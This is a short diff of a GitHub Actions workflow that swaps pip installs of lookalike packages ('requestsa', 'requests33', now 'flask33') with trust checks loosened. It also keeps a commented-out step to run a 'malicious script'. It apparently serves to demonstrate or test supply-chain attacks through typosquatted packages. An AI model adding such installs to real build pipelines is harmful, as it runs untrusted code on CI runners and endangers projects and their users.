@@ -28,11 +28,8 @@ jobs:
 
       - name: Install dependencies
        # run: pip install -r requirements.txt
-        run: pip install --no-deps --trusted-host pypi.org --trusted-host files.pythonhosted.org requests 
-        
-      - run: pip install -i https://test.pypi.org/simple/ requestsa==2.28.1
-
       - run: pip install --no-deps --trusted-host pypi.org --trusted-host files.pythonhosted.org requests33==0.1.0
+      - run: pip install --no-deps --trusted-host pypi.org --trusted-host files.pythonhosted.org flask33==0.1.0
         
    #   - name: 😈 Execute malicious script
     #    run: bash run_malicious_scripts.sh
